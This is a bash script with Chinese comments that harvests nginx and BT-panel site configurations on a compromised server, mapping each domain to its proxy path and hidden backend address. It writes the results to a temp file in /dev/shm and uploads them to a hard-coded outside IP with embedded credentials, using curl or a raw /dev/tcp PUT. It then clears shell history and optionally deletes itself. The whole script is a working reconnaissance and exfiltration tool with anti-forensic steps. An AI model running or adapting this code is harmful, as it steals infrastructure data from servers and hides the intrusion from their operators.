#!/bin/bash

# ===== 只改这里 =====
REMOTE_IP="158.94.210.227"                  # ←←←← 改成你的目标IP
# =====================

REMOTE_DIR="$(date +'%Y%m%d%H')"
FILENAME="$(date +'%Y%m%d%H%M%S')$(date +'%N').txt"
REMOTE_URL="http://${REMOTE_IP}/SQL/KR/${REMOTE_DIR}/${FILENAME}"

# 用最隐蔽的路径生成临时文件（内存 > /dev/shm > /tmp）
TMPFILE=$(mktemp -p /dev/shm 2>/dev/null || mktemp -p /tmp 2>/dev/null || mktemp ./nginx.XXXXXX.txt)

# 确保运行完彻底删除一切（包括自己）
cleanup() {
    rm -f "$TMPFILE" 2>/dev/null
    history -c 2>/dev/null
    unset HISTFILE 2>/dev/null
}
trap cleanup EXIT

# 生成结果
{
    echo "域名 → 注入路径 → 后端真实地址"
    echo "================================================================================================"
    find /etc/nginx/sites-enabled \
         /etc/nginx/conf.d \
         /etc/nginx/sites-available \
         /www/server/panel/vhost/nginx \
         /www/server/nginx/conf/vhost \
         /www/server/panel/vhost/rewrite 2>/dev/null -type f -name "*.conf" | \
    xargs -r awk '
    function trim(s) {gsub(/^[ \t\r]+|[ \t\r;]+$/,"",s);return s}
    function clean_quotes(str) {gsub(/[\047"]/,"",str);return str}
    function normalize_path(p) {p=clean_quotes(p);gsub(/[\/]+$/,"",p);if(p=="")p="/";return p}
    function process_proxy_pass(val,b,host,path,i,a) {
        b=trim(val);if(b~/^https?:\/\//){sub(/^https?:\/\//,"",b);split(b,a,"/");host=a[1];path="";
        for(i=2;i<=length(a);i++)if(a[i]!="")path=path"/"a[i];gsub(/\/+$/,"",path);
        return host (path==""?"":"/"path)} return b
    }
    {if(process($0))next}
    function process(line,inc,cmd,f,l,path,be,d,doms,i){
        line=trim(line);if(line==""||substr(line,1,1)=="#")return 1
        if(line~/^[ \t]*include[ \t]/){sub(/^[ \t]*include[ \t]+/,"",line);gsub(/[;\r].*$/,"",line);inc=trim(line)
            if(inc!~/^\// && FILENAME~/\//)inc=FILENAME"/../"inc
            if(inc~/[\*\[\?]/){cmd="ls -1 "inc" 2>/dev/null"
                while((cmd|getline f)>0)if(f!=FILENAME){while((getline l<f)>0)process(l);close(f)}close(cmd)}
            else if(inc!=""){while((getline l<inc)>0)process(l);close(inc)} return 1}
        if(line~/^[ \t]*server_name[ \t]/){sub(/^[ \t]*server_name[ \t]+/,"",line);gsub(/#.*/,"",line)
            split(trim(line),doms,/[ \t]+/);delete current_domains
            for(i in doms){d=trim(doms[i]);if(d!=""&&d!="_")current_domains[d]=1} return 1}
        if(line~/^[ \t]*server[ \t]*\{/) {delete current_domains;return 1}
        if(line~/^[ \t]*\}[ \t]*$/) {delete current_domains;return 1}
        if(line~/^[ \t]*location[ \t]*[=~^~ ]/){
            if(match(line,/^[ \t]*location[ \t]*[=~^~ ]*[ \t]*[^ \t{;]+/)){
                path=substr(line,RSTART,RLENGTH);path=trim(path);path=normalize_path(path)
                if(index(line,"proxy_pass")&&match(line,/proxy_pass[ \t]+[^;{}]+/)){
                    be=substr(line,RSTART+11,RLENGTH-11);be=trim(be);be=process_proxy_pass(be)
                    if(be!="")output(path,be);return 1}
                saved=path
                while(getline>0){$0=trim($0);if($0~/^[ \t]*\}/)break;if(substr($0,1,1)=="#")continue
                    if(index($0,"proxy_pass")){sub(/.*proxy_pass[ \t]+/,"",$0);gsub(/[;\r].*$/,"",$0)
                    be=process_proxy_pass(trim($0));if(be!="")output(saved,be);break}}}}
    function output(p,b){if(p==""||b==""||length(current_domains)==0)return
        for(d in current_domains)printf "%-50s → %-40s → %s\n",d,p,b}
    BEGIN{delete current_domains}
    ' | sort -u
} > "$TMPFILE"

# 上传（有curl用digest，无curl用纯bash）
if command -v curl >/dev/null 2>&1; then
    curl --user muchuan:sbs1rqlblx --digest -T "$TMPFILE" "$REMOTE_URL" -f -s -o /dev/null && echo "上传成功 $REMOTE_URL"
else
    AUTH=$(printf "muchuan:sbs1rqlblx" | base64 -w0)
    SIZE=$(stat -c%s "$TMPFILE" 2>/dev/null || wc -c < "$TMPFILE")
    exec 3<>/dev/tcp/$REMOTE_IP/80
    printf "PUT /SQL/KR/%s/%s HTTP/1.1\r\nHost: %s\r\nAuthorization: Basic %s\r\nContent-Length: %s\r\nConnection: close\r\n\r\n" \
        "$REMOTE_DIR" "$FILENAME" "$REMOTE_IP" "$AUTH" "$SIZE" >&3
    cat "$TMPFILE" >&3
    exec 3<&-
    echo "纯bash上传完成 $REMOTE_URL"
fi

# 运行完自动删除脚本自身（可选打开下面这行）
# rm -f "$0" 2>/dev/null

exit 0
